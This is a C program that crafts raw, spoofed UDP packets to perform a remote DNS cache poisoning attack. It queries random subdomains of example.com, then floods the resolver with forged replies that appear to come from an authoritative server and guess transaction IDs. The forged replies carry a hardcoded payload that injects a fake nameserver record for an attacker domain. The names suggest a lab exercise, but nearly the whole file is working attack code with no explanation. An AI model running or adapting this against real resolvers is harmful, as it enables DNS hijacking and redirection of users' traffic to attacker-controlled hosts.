// gcc -lpcap udp.c -o udp
#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <libnet.h>
#define PCKT_LEN 8192
#define FLAG_R 0x8400
#define FLAG_Q 0x0100
struct ipheader {
    unsigned char      iph_ihl:4, iph_ver:4;
    unsigned char      iph_tos;
    unsigned short int iph_len;
    unsigned short int iph_ident;
    //unsigned char      iph_flag;
    unsigned short int iph_offset;
    unsigned char      iph_ttl;
    unsigned char      iph_protocol;
    unsigned short int iph_chksum;
    unsigned int       iph_sourceip;
    unsigned int       iph_destip;
};
struct udpheader {
    unsigned short int udph_srcport;
    unsigned short int udph_destport;
    unsigned short int udph_len;
    unsigned short int udph_chksum;
};
struct dnsheader {
    unsigned short int query_id;
    unsigned short int flags;
    unsigned short int QDCOUNT;
    unsigned short int ANCOUNT;
    unsigned short int NSCOUNT;
    unsigned short int ARCOUNT;
};
struct dataEnd {
    unsigned short int  type;
    unsigned short int  class;
};
// total udp header length: 8 bytes (=64 bits)
unsigned int checksum(uint16_t *usBuff, int isize) {
    unsigned int cksum = 0;
    for(; isize > 1; isize -= 2){
        cksum += *usBuff++;
    }
    if(isize == 1){
        cksum += *(uint16_t *)usBuff;
    }
    return (cksum);
}
// calculate udp checksum
uint16_t check_udp_sum(uint8_t *buffer, int len) {
    unsigned long sum = 0;
    struct ipheader *tempI = (struct ipheader *)(buffer);
    struct udpheader *tempH = (struct udpheader *)(buffer + sizeof(struct ipheader));
    struct dnsheader *tempD = (struct dnsheader *)(buffer +sizeof(struct ipheader) + sizeof(struct udpheader));
    tempH->udph_chksum = 0;
    sum = checksum((uint16_t *) &(tempI->iph_sourceip), 8);
    sum += checksum((uint16_t *) tempH, len);
    sum += ntohs(IPPROTO_UDP + len);
    sum = (sum>>16) + (sum & 0x0000ffff);
    sum += (sum>>16);
    return (uint16_t)(~sum);
}
unsigned short csum(unsigned short *buf, int nwords) {
    unsigned long sum;
    for(sum=0; nwords>0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum &0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

int f(char *domain);

int main(int argc, char *argv[]) {
    if(argc != 3){
        printf("- Invalid parameters!!!\nPlease enter 2 ip addresses\nFrom first to last:src_IP  dest_IP  \n");
        exit(-1);
    }
    int sd;
    char buffer[PCKT_LEN];
    memset(buffer, 0, PCKT_LEN);
    struct ipheader *ip = (struct ipheader *) buffer;
    struct udpheader *udp = (struct udpheader *) (buffer+sizeof(struct ipheader));
    struct dnsheader *dns = (struct dnsheader*) (buffer+sizeof(struct ipheader)+sizeof(struct udpheader));
    char *data = (buffer+sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));
    
    dns->flags = htons(FLAG_Q);
    dns->QDCOUNT = htons(1);
    strcpy(data,"\5aaaaa\7example\3com");
    int length = strlen(data)+1;
    struct dataEnd *end = (struct dataEnd *)(data + length);
    end->type = htons(1);
    end->class = htons(1);

    struct sockaddr_in sin, din;
    int one = 1;
    const int *val = &one;
    dns->query_id = rand(); // transaction ID for the query packet, use random #

    // Create a raw socket with UDP protocol
    sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);

    if(sd<0 ) // if socket fails to be created 
        printf("socket error\n");

    sin.sin_family = AF_INET;
    din.sin_family = AF_INET;
    // Port numbers
    sin.sin_port = htons(53);
    din.sin_port = htons(33333);
    // IP addresses
    sin.sin_addr.s_addr = inet_addr(argv[2]); // this is the second argument we input into the program
    din.sin_addr.s_addr = inet_addr(argv[1]); // this is the first argument we input into the program   

    // Fabricate the IP header or we can use the
    // standard header structures but assign our own values.
    ip->iph_ihl = 5;
    ip->iph_ver = 4;
    ip->iph_tos = 0; // Low delay

    // length + dataEnd_size == UDP_payload_size
    unsigned short int packetLength =(sizeof(struct ipheader) + sizeof(struct udpheader)
    +sizeof(struct dnsheader)+length+sizeof(struct dataEnd));

    ip->iph_len=htons(packetLength);
    ip->iph_ident = htons(rand()); // we give a random number for the identification#
    ip->iph_ttl = 110; // hops
    ip->iph_protocol = 17; // UDP
    // Source IP address, can use spoofed address here!!!
    ip->iph_sourceip = inet_addr(argv[1]);
    // The destination IP address
    ip->iph_destip = inet_addr(argv[2]);

    // Fabricate the UDP header. Source port number, redundant
    udp->udph_srcport = htons(33333); 
    // Destination port number
    udp->udph_destport = htons(53);
    // udp_header_size + udp_payload_size
    udp->udph_len = htons(sizeof(struct udpheader)+sizeof(struct dnsheader)+length
    +sizeof(struct dataEnd));

    // Calculate the checksum for integrity//
    ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
    udp->udph_chksum = check_udp_sum(buffer, packetLength-sizeof(struct ipheader));

    // Inform the kernel do not fill up the packet structure. we will build our own...
    if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one))<0 ) {
        printf("error\n");  
        exit(-1);
    }
    int z = 0;
    while(z < 1000) { 
        int charnumber;
        charnumber=1+rand()%5;
        *(data+charnumber)+=1;
        // recalculate the checksum for the UDP packet
        udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader));
        // send the packet out.
        if(sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
          printf("packet send error %d which means %s\n",errno,strerror(errno));
        f(data);
        z++;
    }
    close(sd);
    return 0;
}


int f(char *domain){
    int sd;
    char buffer[PCKT_LEN];
    memset(buffer, 0, PCKT_LEN);
    struct ipheader *ip = (struct ipheader *) buffer;
    struct udpheader *udp = (struct udpheader *) (buffer + sizeof(struct ipheader));
    struct dnsheader *dns = (struct dnsheader *) (buffer + sizeof(struct ipheader) + sizeof(struct udpheader));
    char *data = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader));

    dns->flags = htons(FLAG_R);
    dns->QDCOUNT = htons(1);
    dns->ANCOUNT = htons(1);
    dns->NSCOUNT = htons(1);
    dns->ARCOUNT = htons(2);

    strcpy(data, domain);
    int length = strlen(data) + 1;

    char* s = "\x00\x01\x00\x01\xc0\x0c\x00\x01\x00\x01\x02\x00\x00\x00\x00\x04\x01\x01\x01\x01\xc0\x12\x00\x02\x00\x01\x02\x00\x00\x00\x00\x17\x02\x6e\x73\x0e\x64\x6e\x73\x6c\x61\x62\x61\x74\x74\x61\x63\x6b\x65\x72\x03\x6e\x65\x74\x00\x02\x6e\x73\x0e\x64\x6e\x73\x6c\x61\x62\x61\x74\x74\x61\x63\x6b\x65\x72\x03\x6e\x65\x74\x00\x00\x01\x00\x01\x02\x00\x00\x00\x00\x04\x01\x01\x01\x01\x00\x00\x29\x10\x00\x00\x00\x88\x00\x00\x00";
    memcpy(data + length, s, 103);
    length += 103;
    struct dataEnd *end = (struct dataEnd *)(data + length);
    end->type = htons(1);
    end->class = htons(1);
   
    struct sockaddr_in sin, din;
    int one = 1;
    const int *val = &one;
    dns->query_id=rand();

    sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);

    if(sd < 0)
        printf("socket error\n");

    sin.sin_family = AF_INET;
    din.sin_family = AF_INET;
    sin.sin_port = htons(33333);
    din.sin_port = htons(53);
    sin.sin_addr.s_addr = inet_addr("10.0.2.5");
    din.sin_addr.s_addr = inet_addr("199.43.135.53");

    ip->iph_ihl = 5;
    ip->iph_ver = 4;
    ip->iph_tos = 0;

    unsigned short int packetLength = (sizeof(struct ipheader) + sizeof(struct udpheader) 
    + sizeof(struct dnsheader) + length + sizeof(struct dataEnd));

    ip->iph_len = htons(packetLength);
    ip->iph_ident = htons(rand());
    ip->iph_ttl = 110;
    ip->iph_protocol = 17;
    ip->iph_sourceip = inet_addr("199.43.135.53");
    ip->iph_destip = inet_addr("10.0.2.5");

    udp->udph_srcport = htons(53);

    udp->udph_destport = htons(33333);
    udp->udph_len = htons(sizeof(struct udpheader) + sizeof(struct dnsheader) + length 
    + sizeof(struct dataEnd));

    ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
    udp->udph_chksum = check_udp_sum(buffer, packetLength - sizeof(struct ipheader));

    if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0 ){
        printf("error\n");
        exit(-1);
    }

    int count = 0;
    while(count < 1000){
        dns->query_id=rand();
        udp->udph_chksum = check_udp_sum(buffer, packetLength - sizeof(struct ipheader));
        if(sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
            printf("packet send error %d which means %s\n", errno, strerror(errno));
        count++;
    }
    close(sd);
    return 0;
}